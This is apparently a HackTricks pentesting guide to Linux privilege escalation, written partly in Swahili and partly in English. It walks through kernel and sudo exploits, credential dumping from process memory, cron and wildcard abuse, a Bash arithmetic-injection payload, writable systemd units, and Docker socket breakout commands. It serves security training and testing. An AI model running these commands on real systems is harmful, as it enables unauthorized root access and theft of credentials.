# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Mfumo

### Taarifa za OS

Tuanze kupata maarifa kuhusu OS inayokimbia
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Ikiwa una **ruhusa za kuandika kwenye folda yoyote ndani ya variable `PATH`** unaweza ku-hijack baadhi ya libraries au binaries:
```bash
echo $PATH
```
### Taarifa za Env

Je, kuna taarifa za kuvutia, passwords au API keys katika environment variables?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Angalia version ya kernel na kama kuna exploit yoyote ambayo inaweza kutumika kuinua privileges.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya kernel zilizo na udhaifu na baadhi ya **compiled exploits** tayari hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Tovuti nyingine ambapo unaweza kupata baadhi ya **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa matoleo yote ya kernel yenye udhaifu kutoka kwenye wavuti hiyo unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Vifaa vinavyoweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (endesha IN victim, inachunguza tu exploits kwa kernel 2.x)

Daima **tafuta kernel version katika Google**, labda kernel version yako imeandikwa katika exploit fulani ya kernel na hivyo utakuwa na uhakika kwamba exploit hii ni halali.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

Kulingana na matoleo ya sudo yaliyo hatarishi yanayoonekana katika:
```bash
searchsploit sudo
```
Unaweza kuangalia ikiwa toleo la sudo lina udhaifu kwa kutumia grep hii.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Toleo za sudo kabla ya 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) zinawezesha watumiaji wa ndani wasiokuwa na vibali kupandisha ruhusa zao hadi root kupitia chaguo la sudo `--chroot` wakati faili ya `/etc/nsswitch.conf` inapotumika kutoka kwenye saraka inayodhibitiwa na mtumiaji.

Hapa kuna [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Kabla ya kuendesha exploit, hakikisha toleo lako la `sudo` linaloweza kuathiriwa na kwamba linaunga mkono kipengele cha `chroot`.

Kwa maelezo zaidi, rejea [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: uthibitisho wa saini ulishindwa

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi vuln hii inaweza kutumika
```bash
dmesg 2>/dev/null | grep "signature"
```
### Uorodheshaji zaidi wa mfumo
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Orodhesha ulinzi unaowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ikiwa uko ndani ya docker container unaweza kujaribu kutoroka kutoka kwake:

{{#ref}}
docker-security/
{{#endref}}

## Diski

Angalia **what is mounted and unmounted**, wapi na kwa nini. Ikiwa chochote kime-unmounted unaweza kujaribu ku-mount na kukagua kwa taarifa za kibinafsi
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu muhimu

Orodhesha binaries muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia kama **kuna compiler yoyote imewekwa**. Hii ni muhimu ikiwa unahitaji kutumia kernel exploit fulani, kwani inashauriwa kucompile kwenye mashine utakayotumia (au kwenye ile inayofanana).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Zenye Udhaifu Zilizowekwa

Angalia **toleo la paketi na huduma zilizowekwa**. Huenda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza kutumika kwa ajili ya escalating privileges…\
Inashauriwa kukagua kwa mikono toleo la programu zilizosakinishwa zinazoshukiwa zaidi.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ikiwa una ufikiaji wa SSH kwenye mashine unaweza pia kutumia **openVAS** kukagua programu zisizosasishwa na zilizo na udhaifu zilizosakinishwa ndani ya mashine.

> [!NOTE] > _Kumbuka kwamba amri hizi zitaonyesha taarifa nyingi ambazo kwa kawaida hazitakuwa na msaada; kwa hiyo inapendekezwa kutumia programu kama OpenVAS au programu zinazofanana ambazo zitakagua ikiwa toleo lolote la programu lililosakinishwa lina udhaifu dhidi ya exploits zinazojulikana_

## Michakato

Angalia **ni michakato gani** inayoendeshwa na uhakiki ikiwa mchakato wowote una **idhinishaji zaidi kuliko inavyostahili** (labda tomcat inayoendeshwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Process monitoring

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### Process memory

Some services of a server save **credentials in clear text inside the memory**.\
Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
However, remember that **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skripti ya GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Kwa process ID fulani, **maps yanaonyesha jinsi memory imepangwa ndani ya** nafasi ya anwani pepe ya process hiyo; pia inaonyesha **ruhusa za kila eneo lililowekwa ramani**. Faili pseudo **mem** inafichua **kumbukumbu za process yenyewe**. Kutoka kwa faili ya **maps** tunajua ni **eneo za memory zinazosomeka** na offsets zao. Tunatumia taarifa hii **seek into the mem file and dump all readable regions** kwenye faili.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` hutoa ufikiaji wa **kumbukumbu ya kimwili** ya mfumo, si kumbukumbu pepe. Nafasi ya anwani za kumbukumbu pepe ya kernel inaweza kupatikana kwa kutumia /dev/kmem.\
Kawaida, `/dev/mem` inaweza kusomwa tu na **root** na kikundi cha **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump kwa linux

ProcDump ni toleo la Linux linalobuniwa upya la zana ya ProcDump ya klasiki kutoka katika suite ya zana ya Sysinternals kwa Windows. Pata katika [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Vifaa

Ili dump process memory unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kwa mikono kuondoa mahitaji ya root na dump process inayomilikiwa na wewe
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Credentials kutoka Process Memory

#### Mfano wa mkono

Ikiwa unagundua kwamba authenticator process inaendesha:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza dump the process (tazama sehemu za hapo awali ili kupata njia tofauti za dump the memory of a process) na utafute credentials ndani ya memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Chombo [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) kitapora **alama za kuingia kwa maandishi wazi** kutoka kumbukumbu na kutoka kwa baadhi ya **faili zinazojulikana**. Inahitaji vibali vya root ili kifanye kazi ipasavyo.

| Sifa                                              | Jina la Mchakato     |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Tafuta Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Majukumu ya Scheduled/Cron

### Crontab UI (alseambusher) inapoendeshwa kama root – web-based scheduler privesc

Ikiwa paneli ya wavuti "Crontab UI" (alseambusher/crontab-ui) inapoendeshwa kama root na imefungwa kwa loopback pekee, bado unaweza kuifikia kupitia SSH local port-forwarding na kuunda kazi yenye vibali vya juu ili kupandisha hadhi.

Mnyororo wa kawaida
- Gundua bandari iliyofungwa kwa loopback pekee (mf., 127.0.0.1:8000) na Basic-Auth realm kupitia `ss -ntlp` / `curl -v localhost:8000`
- Tafuta credentials katika operational artifacts:
- Backups/scripts zenye `zip -P <password>`
- systemd unit inayoonyesha `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tengeneza tunnel na ingia:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Unda high-priv job na uiendeshe mara moja (hutoa SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Tumia:
```bash
/tmp/rootshell -p   # root shell
```
Uimarishaji
- Usiruhusu Crontab UI kuendesha kama root; uitenge kwa mtumiaji maalum na ruhusa ndogo
- Funga kwa localhost na pia zuia upatikanaji kupitia firewall/VPN; usitumie tena nywila
- Epuka kujaza secrets ndani ya unit files; tumia secret stores au root-only EnvironmentFile
- Washa audit/logging kwa utekelezaji wa jobs za on-demand

Angalia kama kuna scheduled job yoyote yenye ulegevu. Labda unaweza kuchukua faida ya script inayotekelezwa na root (wildcard vuln? unaweza kubadilisha files ambazo root hutumia? tumia symlinks? unda specific files katika directory ambayo root hutumia?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kumbuka jinsi mtumiaji "user" ana haki za kuandika juu ya /home/user_)

Ikiwa ndani ya crontab hii mtumiaji root anajaribu kutekeleza amri au script bila kuweka PATH. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Kisha, unaweza kupata shell ya root kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron inapotumia script yenye wildcard (Wildcard Injection)

Iwapo script inayotekelezwa na root ina “**\***” ndani ya amri, unaweza kuitumia kusababisha matokeo yasiyotegemewa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ikiwa wildcard imeambatana na njia kama** _**/some/path/\***_ **, haiko hatarini (hata** _**./\***_ **si hatarini).**

Soma ukurasa ufuatao kwa mbinu zaidi za wildcard exploitation:

{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Bash arithmetic expansion injection in cron log parsers

Bash inafanya parameter/variable expansion na command substitution kabla ya arithmetic evaluation katika ((...)), $((...)) na let. Ikiwa root cron/parser inasoma field za log zisizotegemewa na kuziingiza kwenye muktadha wa arithmetic, mshambuliaji anaweza kuingiza command substitution $(...) itakayotekelezwa kama root wakati cron inapoendesha.

- Why it works: Katika Bash, expansions hutokea kwa mpangilio huu: parameter/variable expansion, command substitution, arithmetic expansion, kisha word splitting na pathname expansion. Kwa hivyo thamani kama `$(/bin/bash -c 'id > /tmp/pwn')0` hubadilishwa kwanza (kwa kuendesha amri), kisha nambari iliyobaki `0` inatumiwa kwa arithmetic ili script iendelee bila makosa.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Weka maandishi yanayodhibitiwa na mshambuliaji ndani ya log inayosomwa ili uwanja unaoonekana kuwa nambari uwe na command substitution na umalize kwa digit. Hakikisha amri yako haisichapi kwenye stdout (au uielekeze vinginevyo) ili arithmetic ibaki halali.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ikiwa script inayotekelezwa na root inatumia **directory ambapo una ufikiaji kamili**, inaweza kuwa ya msaada kufuta folder hiyo na **kuunda folder ya symlink kuelekea nyingine** inayotumikia script unayodhibiti.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Cron jobs za mara kwa mara

Unaweza kufuatilia michakato ili kutafuta zile zinazotekelezwa kila dakika 1, 2 au 5. Labda unaweza kuchukua fursa yake na escalate privileges.

Kwa mfano, ili **kufuatilia kila 0.1s kwa muda wa dakika 1**, **kupanga kwa amri zilizoendeshwa mara chache** na kufuta amri zilizotekelezwa zaidi, unaweza kufanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (itaangalia na kuorodhesha kila mchakato unaoanza).

### Cron jobs zisizoonekana

Inawezekana kuunda cronjob **putting a carriage return after a comment** (without newline character), na cron job itafanya kazi. Mfano (zingatia carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Huduma

### Mafaili ya _.service_ yanayoweza kuandikwa

Angalia kama unaweza kuandika faili yoyote ya `.service`; ikiwa unaweza, unaweza **kuibadilisha** ili **itekeleze** backdoor yako wakati huduma inapo **anza**, **anzishwa upya** au **simamishwa** (labda utahitaji kusubiri hadi mashine ianzishwe upya).\
Kwa mfano, tengeneza backdoor yako ndani ya faili ya .service kwa **`ExecStart=/tmp/script.sh`**

### Service binaries zinazoweza kuandikwa

Kumbuka kwamba ikiwa una **idhini za kuandika juu ya binaries zinazotekelezwa na services**, unaweza kuzibadilisha kuwa backdoors ili wakati services zitakapotekelezwa tena backdoors zitatekelezwa.

### systemd PATH - Relative Paths

Unaweza kuona PATH inayotumika na **systemd** kwa:
```bash
systemctl show-environment
```
Ukitambua kuwa unaweza **kuandika** katika yoyote ya folda za njia hiyo unaweza kuwa na uwezo wa **escalate privileges**. Unahitaji kutafuta **relative paths being used on service configurations** kwenye faili kama:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Baada yake, tengeneza **executable** yenye **jina sawa na binary ya relative path** ndani ya folda ya PATH ya systemd ambayo unaweza kuandika, na wakati service itaombwa kutekeleza kitendo dhaifu (**Start**, **Stop**, **Reload**), **backdoor** yako itaendeshwa (watumiaji wasiokuwa na ruhusa kawaida hawawezi kuanza/kusimamisha services lakini angalia kama unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu services kwa kutumia `man systemd.service`.**

## **Timers**

**Timers** ni systemd unit files ambazo jina lao linamalizika kwa `**.timer**` ambazo zinadhibiti `**.service**` files au events. **Timers** zinaweza kutumika kama mbadala wa cron kwa sababu zina msaada uliojengewa ndani kwa calendar time events na monotonic time events na zinaweza kuendeshwa asynchronously.

Unaweza kuorodhesha timers zote kwa:
```bash
systemctl list-timers --all
```
### Taimera zinazoweza kuandikwa

Ikiwa unaweza kubadilisha taimera, unaweza kuifanya itekeleze baadhi ya vitu vya systemd.unit (kama `.service` au `.target`)
```bash
Unit=backdoor.service
```
> Unit itakayowashwa wakati timer hii inapomalizika. Hoja ni jina la unit, ambalo kiondo chake si ".timer". Ikiwa halitajwi, thamani hii inabadilika kuwa service ambayo ina jina lile lile kama timer unit, isipokuwa kwa kiondo. (Tazama hapo juu.) Inashauriwa kwamba jina la unit linalowashwa na jina la unit la timer vitakuwa vimepewa jina kwa njia ile ile, isipokuwa kwa kiondo.

Kwa hiyo, ili kutumia vibaya ruhusa hii utahitaji:

- Pata systemd unit fulani (kama a `.service`) ambayo iko **inayotekeleza binary inayoweza kuandikwa**
- Pata systemd unit fulani ambayo iko **inayotekeleza relative path** na wewe una **writable privileges** juu ya **systemd PATH** (ili kuiga executable hiyo)

**Jifunze zaidi kuhusu timers kwa `man systemd.timer`.**

### **Kuwawezesha Timer**

Ili kuwezesha timer unahitaji root privileges na kufanya execute:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Kumbuka **timer** inawezeshwa kwa kuunda symlink kwake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) huwezesha **mawasiliano ya process** kwenye mashine moja au mbili tofauti ndani ya modeli za client-server. Zinatumia standard Unix descriptor files kwa mawasiliano kati ya kompyuta na zinaanzishwa kupitia faili za `.socket`.

Sockets zinaweza kusanidiwa kwa kutumia faili za `.socket`.

**Jifunze zaidi kuhusu sockets kwa `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa vinavyovutia vinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguzi hizi ni tofauti lakini muhtasari hutumika kuonyesha **mahali itakaposikiliza** socket (njia ya faili ya AF_UNIX socket, IPv4/6 na/au nambari ya bandari kusikiliza, nk.)
- `Accept`: Inapokea argument ya boolean. Ikiwa **true**, **service instance huundwa kwa kila muunganisho unaokuja** na socket ya muunganisho pekee ndiyo itapitishwa kwake. Ikiwa **false**, sockets zote zinazolisikiliza **zitatumwa kwa service unit iliyozinduliwa**, na unit moja ya service itaundwa kwa miunganisho yote. Thamani hii haizingatiwi kwa datagram sockets na FIFOs ambapo unit moja ya service inashughulikia kwa uhakika trafiki yote inayoingia. **Defaults to false**. Kwa sababu za utendaji, inashauriwa kuandika daemons mpya kwa njia inayofaa kwa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Zinachukua mistari ya amri moja au zaidi, ambazo zinatekelezwa **kabla** au **baada** ya `sockets`/FIFOs zinazolisikilizwa **kuundwa** na **kuunganishwa**, mtawalia. Tokeni ya kwanza ya mstari wa amri lazima iwe jina la faili la absolute, ikifuatiwa na hoja za mchakato.
- `ExecStopPre`, `ExecStopPost`: Amri za ziada ambazo zinatekelezwa **kabla** au **baada** ya `sockets`/FIFOs zinazolisikilizwa **kufungwa** na kuondolewa, mtawalia.
- `Service`: Inaelezea jina la service unit **kutumika** kwenye **trafiki inayokuja**. Mipangilio hii inaruhusiwa tu kwa sockets zenye Accept=no. Kwa chaguo-msingi inabeba service yenye jina sawa na socket (ikiwa kiambatisho kimebadilishwa). Kwa kawaida, haitakuwa lazima kutumia chaguo hili.

### Writable .socket files

Ikiwa utapata faili ya `.socket` ambayo ni **writable** unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na backdoor itatekelezwa kabla socket kuundwa. Kwa hiyo, **huenda utahitaji kusubiri hadi mashine irejeshwe upya.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

Ikiwa **utatambua socket yoyote inayoweza kuandikwa** (_sasa tunazungumzia Unix Sockets na si faili za config `.socket`_), basi **unaweza kuwasiliana** na socket hiyo na labda ukaweza exploit udhaifu.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Muunganisho ghafi
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Mfano wa exploitation:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kwamba kunaweza kuwa na baadhi ya **sockets zinazosikiliza maombi ya HTTP** (_Sinaongea kuhusu .socket files bali kuhusu faili zinazofanya kazi kama unix sockets_). Unaweza kuangalia hili kwa:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ikiwa socket **inajibu kwa ombi la HTTP**, basi unaweza **kuwasiliana** nayo na labda **kutumia udhaifu fulani**.

### Docker Socket inayoweza kuandikwa

The Docker socket, often found at `/var/run/docker.sock`, ni faili muhimu ambayo inapaswa kuwekewa usalama. Kwa chaguo-msingi, inaweza kuandikwa na mtumiaji `root` na wanachama wa kikundi cha `docker`. Kuwa na haki za kuandika kwenye socket hii kunaweza kusababisha privilege escalation. Hapa kuna muhtasari wa jinsi hili linaweza kufanyika na njia mbadala ikiwa Docker CLI haipo.

#### **Privilege Escalation with Docker CLI**

Ikiwa una haki za kuandika kwenye Docker socket, unaweza escalate privileges kwa kutumia amri zifuatazo:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Hizi amri zinakuwezesha kuendesha container ukiwa na root-level access kwenye filesystem ya host.

#### **Kutumia Docker API Moja kwa Moja**

Katika matukio ambapo Docker CLI haipo, docker socket bado inaweza kudhibitiwa kwa kutumia Docker API na amri za `curl`.

1.  **Orodhesha Docker Images:** Pata orodha ya images zinazopatikana.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Tengeneza Container:** Tuma ombi la kuunda container inayopima root directory ya mfumo wa host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Anzisha container iliyoundwa hivi karibuni:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Unganishwa na Container:** Tumia `socat` kuanzisha muunganisho kwa container, kuruhusu utekelezaji wa amri ndani yake.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Baada ya kusanidi muunganisho wa `socat`, unaweza kutekeleza amri moja kwa moja ndani ya container ukiwa na root-level access kwenye filesystem ya host.

### Wengine

Kumbuka kwamba ikiwa una write permissions juu ya docker socket kwa sababu uko **ndani ya group `docker`** una [**njia zaidi za kuongeza privileges**](interesting-groups-linux-pe/index.html#docker-group). Ikiwa [**docker API inasikiliza kwenye port** unaweza pia kuwa na uwezo wa kuiteka](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia **njia zaidi za kutoroka kutoka docker au kuiba matumizi yake kwa escalation ya privileges** katika:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Ikiwa unagundua kwamba unaweza kutumia amri ya **`ctr`** soma ukurasa ufuatao kwa sababu **huenda ukaweza kuipeleka kwa matumizi ili kuongeza privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

